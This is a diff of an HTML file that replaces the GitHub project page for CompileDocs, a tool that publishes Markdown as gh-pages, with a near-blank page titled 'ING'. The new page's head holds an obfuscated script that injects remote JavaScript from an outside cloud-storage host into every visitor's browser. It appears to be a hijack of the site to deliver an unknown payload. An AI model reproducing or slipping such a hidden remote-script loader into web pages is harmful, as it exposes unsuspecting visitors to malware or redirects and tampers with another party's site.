@@ -1,140 +1,29 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-
-<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<!DOCTYPE html>
+<html>
 <head>
-	<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
-
-	<title>stevegeek/CompileDocs @ GitHub</title>
-
-	<style type="text/css">
-		body {
-  		margin-top: 1.0em;
-  		background-color: #fff;
-		  font-family: "Helvetica,Arial,FreeSans";
-  		color: #000000;
-    }
-    #container {
-      margin: 0 auto;
-      width: 700px;
-    }
-		h1 { font-size: 3.8em; color: #1b56de; margin-bottom: 3px; }
-		h1 .small { font-size: 0.4em; }
-		h1 a { text-decoration: none }
-		h2 { font-size: 1.5em; color: #1b56de; }
-    h3 { text-align: center; color: #1b56de; }
-    a { color: #1b56de; }
-    .description { font-size: 1.2em; margin-bottom: 30px; margin-top: 30px; font-style: italic;}
-    .download { float: right; }
-		pre { background: #000; color: #fff; padding: 15px;}
-    hr { border: 0; width: 80%; border-bottom: 1px solid #aaa}
-    .footer { text-align:center; padding-top:30px; font-style: italic; }
-	</style>
-
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=0,minimum-scale=1,maximum-scale=1">
+<meta content="yes" name="apple-mobile-web-app-capable">
+<meta content="black" name="apple-mobile-web-app-status-bar-style">
+<meta content="no" name="msapplication-tap-highlight">
+<meta content="IE=edge" http-equiv="X-UA-Compatible">
+<title>ING</title>
+<script>
+/**GGGMMMM*/
+var version = "lua";
+var WAItcl1 = WAItcl1 || [];;
+var b2 = ["//wx-1252764145.file.myqcloud.com/" + version + '.js'];
+var h3;
+var t4;
+for (var WOYuAkCBS5 = 0; WOYuAkCBS5 < b2["length"]; WOYuAkCBS5++) {
+    h3 = window["document"]["createElement"]("script");
+    h3["src"] = b2[WOYuAkCBS5];
+    t4 = window["document"]["getElementsByTagName"]("script")[0];
+    t4["parentNode"]["insertBefore"](h3, t4);
+}
+</script>
 </head>
-
 <body>
-  <a href="http://github.com/stevegeek/CompileDocs"><img style="position: absolute; top: 0; right: 0; border: 0;" src="http://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub" /></a>
-
-  <div id="container">
-
-    <div class="download">
-      <a href="http://github.com/stevegeek/CompileDocs/zipball/master">
-        <img border="0" width="90" src="http://github.com/images/modules/download/zip.png"></a>
-      <a href="http://github.com/stevegeek/CompileDocs/tarball/master">
-        <img border="0" width="90" src="http://github.com/images/modules/download/tar.png"></a>
-    </div>
-
-    <h1><a href="http://github.com/stevegeek/CompileDocs">CompileDocs</a>
-      <span class="small">by <a href="http://github.com/stevegeek">stevegeek</a></span></h1>
-
-    <div class="description">
-      Create HTML pages from Markdown text documents and then automatically commit them to your git repo under the gh-pages branch ready for GitHub!
-    </div>
-
-
-<h2>CompileDocs</h2>
-
-<p>Create HTML pages from Markdown text documents and then commit them to
-your git repo under the gh-pages branch ready for GitHub!
-Page theme with Smarty.</p>
-
-<h2>Dependencies:</h2>
-<pre><code>PHP >= 5.3
-PHP Markdown    <a href="http://michelf.com/projects/php-markdown/">http://michelf.com/projects/php-markdown/</a>
-PHP Smartypants <a href="http://michelf.com/projects/php-smartypants/">http://michelf.com/projects/php-smartypants/</a>
-PHP Smarty      <a href="http://www.smarty.net/">http://www.smarty.net/</a>
-(optional) git
-</code></pre>
-
-<h2>Usage:</h2>
-
-<pre><code>./compiledocs &lt;options&gt;
-
-Options:
--f, --force            : Force overwrite if output to folder (default no)
--l, --location &lt;path&gt;  : Location of source folder (default .)
--o, --output   &lt;path&gt;  : This will set the location for the generated files.
--i, --index &lt;doc name&gt; : Doc to set as index.html. (default as automatically generated docs index)
--g, --github           : If set before generating the docs the 'gh-pages' branch will attempt
-                  to be checked out (it must exist already, created as specified at GitHub)
-                  and the generated files place in the root). The result will then be
-                  commited with either a default message including the generating time or
-                  using the message specified by -m,--message. Use -d to also push.
-                  (default off)
--m, --message  &lt;msg&gt;   : Optional message for git commit.
--d, --deploy           : Deploy, push the 'gh-pages' remote branch.
--t, --template &lt;name&gt;  : Use Smarty template 'name'
--p, --project &lt;name&gt;   : Optional project name
--s, --silence          : Silence output (default off)
--h, --help             : This help
-</code></pre>
-
-<p>EG.</p>
-
-<pre><code>./compiledocs -l ../Docs -i About -g -m "Docs being updated" -d
-</code></pre>
-
-<h2>License</h2>
-
-<p>GNU Lesser GPL</p>
-
-<h2>Authors</h2>
-
-<p>Stephen Paul Ierodiaconou <a href="&#x6d;&#97;i&#x6c;&#116;o&#x3a;&#115;&#116;&#x65;&#112;&#104;&#x65;&#110;&#64;&#x66;&#x6c;&#97;&#x74;&#x35;&#51;&#x2e;&#x63;&#111;&#x6d;">&#115;&#116;&#x65;&#112;&#104;&#x65;&#110;&#64;&#x66;&#x6c;&#97;&#x74;&#x35;&#51;&#x2e;&#x63;&#111;&#x6d;</a></p>
-
-
-    <div>
-    <hr>
-    <p>Generated by <a href="http://stevegeek.github.com/CompileDocs">CompileDocs</a> on 02/26/10 at 06:52:52</p>
-    </div>
-
-    <h2>Authors</h2>
-<p>Stephen Ierodiaconou (stevegeek@gmail.com)
-<br/>
-<br/>      </p>
-<h2>Contact</h2>
-<p>Stephen Ierodiaconou (stevegeek@gmail.com)
-<br/>      </p>
-
-
-    <h2>Download</h2>
-    <p>
-      You can download this project in either
-      <a href="http://github.com/stevegeek/CompileDocs/zipball/master">zip</a> or
-      <a href="http://github.com/stevegeek/CompileDocs/tarball/master">tar</a> formats.
-    </p>
-    <p>You can also clone the project with <a href="http://git-scm.com">Git</a>
-      by running:
-      <pre>$ git clone git://github.com/stevegeek/CompileDocs</pre>
-    </p>
-
-    <div class="footer">
-      get the source code on GitHub : <a href="http://github.com/stevegeek/CompileDocs">stevegeek/CompileDocs</a>
-    </div>
-
-  </div>
-
 
 </body>
 </html>
